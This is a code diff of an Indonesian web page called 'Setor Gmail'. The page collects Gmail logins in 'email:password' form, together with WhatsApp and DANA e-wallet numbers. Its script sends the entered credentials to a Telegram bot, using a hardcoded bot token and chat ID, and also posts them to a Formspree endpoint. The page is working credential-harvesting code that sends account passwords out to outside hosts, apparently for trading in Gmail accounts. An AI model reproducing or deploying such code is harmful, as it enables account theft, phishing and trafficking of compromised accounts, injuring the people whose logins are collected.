@@ -3,169 +3,125 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Setor Akun Gmail</title>
+<title>Setor Gmail</title>
 
 <style>
-:root{
---bg:#020617;
---glass:rgba(255,255,255,0.05);
---border:rgba(255,255,255,0.1);
---primary:#6366f1;
---text:#e2e8f0;
---success:#22c55e;
-}
-
 body{
 margin:0;
-font-family:sans-serif;
-background:radial-gradient(circle at top,#0f172a,#020617);
-color:var(--text);
-}
-
-.container{
-max-width:520px;
-margin:40px auto;
-padding:30px;
-background:var(--glass);
-backdrop-filter:blur(18px);
-border:1px solid var(--border);
-border-radius:18px;
-box-shadow:0 10px 40px rgba(0,0,0,0.6);
-}
-
-h1{text-align:center;}
-
-.sub{
-text-align:center;
-font-size:13px;
-opacity:.7;
-margin-bottom:20px;
-}
-
-.trust{
+font-family:Arial;
+background:#0f172a;
+color:white;
 display:flex;
-gap:8px;
-margin-bottom:20px;
+justify-content:center;
+align-items:center;
+height:100vh;
 }
-.trust div{
-flex:1;
+
+.box{
+width:350px;
+padding:25px;
+background:#1e293b;
+border-radius:15px;
+box-shadow:0 0 30px rgba(0,0,0,0.5);
+}
+
+h1{
 text-align:center;
-padding:10px;
-background:var(--glass);
-border-radius:10px;
-border:1px solid var(--border);
-font-size:13px;
+margin-bottom:15px;
 }
 
 input,textarea{
 width:100%;
-padding:12px;
-margin-bottom:12px;
-border-radius:10px;
-border:1px solid var(--border);
-background:transparent;
+padding:10px;
+margin:8px 0;
+border:none;
+border-radius:8px;
+background:#0f172a;
 color:white;
-}
-
-#total{
-text-align:center;
-color:var(--success);
-font-weight:bold;
-margin-bottom:10px;
 }
 
 button{
 width:100%;
-padding:14px;
+padding:12px;
 border:none;
-border-radius:12px;
-background:linear-gradient(45deg,#6366f1,#4f46e5);
+border-radius:10px;
+background:#6366f1;
 color:white;
 font-weight:bold;
 cursor:pointer;
 }
 
+button:hover{
+background:#4f46e5;
+}
+
 #msg{
 text-align:center;
 margin-top:10px;
-font-size:13px;
-color:var(--success);
-}
-
-.footer{
-margin-top:20px;
-font-size:12px;
-opacity:.6;
-text-align:center;
+color:#22c55e;
 }
 </style>
 </head>
 
 <body>
 
-<div class="container">
-<h1>SETOR AKUN GMAIL</h1>
-<div class="sub">Proses cepat • Pembayaran 1–24 jam</div>
+<div class="box">
+<h1>SETOR GMAIL</h1>
 
-<div class="trust">
-<div>✔ Aman</div>
-<div>⚡ Cepat</div>
-<div>💰 Dibayar</div>
-</div>
+<form id="form">
 
-<form action="https://formspree.io/f/mreyvjll" method="POST" id="form">
+<textarea id="akun" placeholder="email:password" required></textarea>
+<input type="number" id="jumlah" placeholder="Jumlah akun" required>
+<input type="text" id="wa" placeholder="No WhatsApp" required>
+<input type="text" id="dana" placeholder="No DANA" required>
 
-<!-- FIX DI SINI -->
-<textarea name="akun" placeholder="email:password" required></textarea>
-
-<input type="number" id="jumlah" name="jumlah" placeholder="Jumlah akun" required>
-
-<div id="total"></div>
-
-<input type="text" name="wa" placeholder="Nomor WhatsApp" required>
-<input type="text" name="dana" placeholder="Nomor DANA" required>
-
-<input type="hidden" name="_subject" value="Setoran Gmail Masuk">
-
-<button type="submit">Kirim Sekarang</button>
-
+<button type="submit">Kirim</button>
 <p id="msg"></p>
 
 </form>
-
-<div class="footer">
-Pastikan data benar sebelum mengirim
-</div>
 </div>
 
 <script>
-const harga=1500;
-const jumlah=document.getElementById('jumlah');
-const total=document.getElementById('total');
+const form=document.getElementById("form");
 
-jumlah.addEventListener('input',()=>{
-total.innerText="Total: Rp "+(jumlah.value*harga);
+form.addEventListener("submit",async(e)=>{
+e.preventDefault();
+
+document.getElementById("msg").innerText="Mengirim...";
+
+const akun=document.getElementById("akun").value;
+const jumlah=document.getElementById("jumlah").value;
+const wa=document.getElementById("wa").value;
+const dana=document.getElementById("dana").value;
+
+const text=`SETOR BARU
+
+${akun}
+
+Jumlah: ${jumlah}
+WA: ${wa}
+DANA: ${dana}`;
+
+try{
+
+/* 1. KIRIM TELEGRAM */
+await fetch("https://api.telegram.org/bot8657907532:AAFmZLlol8V-nKu1zehXHM6KakBcc3xT-7s/sendMessage?chat_id=5943311408&text="+encodeURIComponent(text));
+
+/* 2. KIRIM KE FORMSPREE */
+await fetch("https://formspree.io/f/mreyvjll",{
+method:"POST",
+headers:{
+'Accept':'application/json'
+},
+body:new FormData(form)
 });
 
-document.getElementById("form").addEventListener("submit",function(){
+document.getElementById("msg").innerText="Berhasil dikirim!";
+form.reset();
 
-document.getElementById("msg").innerText="Sedang mengirim...";
-
-/* TELEGRAM NOTIF */
-const akun=document.querySelector('textarea[name="akun"]').value;
-const jml=document.getElementById('jumlah').value;
-const wa=document.querySelector('input[name="wa"]').value;
-const dana=document.querySelector('input[name="dana"]').value;
-
-const text=`🔥 SETOR MASUK 🔥
-
-📧 ${akun}
-
-📦 Jumlah: ${jml}
-📱 WA: ${wa}
-💰 DANA: ${dana}`;
-
-fetch("https://api.telegram.org/bot8657907532:AAFmZLlol8V-nKu1zehXHM6KakBcc3xT-7s/sendMessage?chat_id=5943311408&text="+encodeURIComponent(text));
+}catch(err){
+document.getElementById("msg").innerText="Gagal kirim!";
+}
 
 });
 </script>
